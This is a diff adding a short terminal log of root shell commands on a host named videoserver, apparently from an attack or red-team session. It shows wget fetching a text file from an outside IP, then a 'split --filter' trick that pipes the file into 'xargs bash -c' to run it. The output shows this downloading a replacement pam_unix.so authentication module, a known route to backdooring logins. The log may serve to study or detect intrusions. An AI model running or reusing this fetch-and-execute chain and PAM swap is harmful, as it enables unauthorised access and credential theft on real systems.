@@ -1,0 +1,36 @@
+--- 2025-09-22 08:01:13 INFO: ---
+
+Command: cd /root; wget -O README.txt http://192.42.1.174/README.txt.4
+cd /root; wget -O README.txt http://192.42.1.174/README.txt.4
+--2025-09-22 08:01:11--  http://192.42.1.174/README.txt.4
+Connecting to 192.42.1.174:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 98 [text/plain]
+Saving to: 'README.txt'
+
+
+README.txt                     0%[                                               ]       0  --.-KB/s               
+README.txt                   100%[==============================================>]      98  --.-KB/s    in 0s      
+
+2025-09-22 08:01:11 (21.6 MB/s) - 'README.txt' saved [98/98]
+
+root@videoserver:~# 
+root@videoserver:~# 
+--- 2025-09-22 08:01:29 INFO: ---
+
+Command: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
+split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
+--2025-09-22 08:01:28--  http://192.42.1.174/pam_unix.so
+Connecting to 192.42.1.174:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 214664 (210K)
+Saving to: 'pam_unix.so'
+
+
+pam_unix.so                    0%[                                               ]       0  --.-KB/s               
+pam_unix.so                  100%[==============================================>] 209.63K  --.-KB/s    in 0.004s  
+
+2025-09-22 08:01:28 (49.0 MB/s) - 'pam_unix.so' saved [214664/214664]
+
+root@videoserver:~# 
+root@videoserver:~# 
